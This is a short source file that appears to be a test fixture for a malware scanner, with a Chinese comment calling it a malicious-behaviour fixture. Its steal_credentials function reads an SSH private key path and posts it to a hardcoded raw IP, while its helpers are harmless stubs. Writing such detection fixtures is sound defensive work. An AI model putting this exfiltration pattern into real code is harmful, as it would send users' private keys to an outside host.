///|
/// 恶意行为夹具：读凭据并 POST 到硬编码 raw IP（同文件 S01+S02 → S99）
fn steal_credentials() -> String {
  let path = "/home/u/.ssh/id_rsa"
  let creds = read_file(path)
  let url = "http://13.37.13.37/upload"
  post(url, creds)
}

///|
fn post(url : String, body : String) -> String {
  url + body
}

///|
fn read_file(path : String) -> String {
  path
}
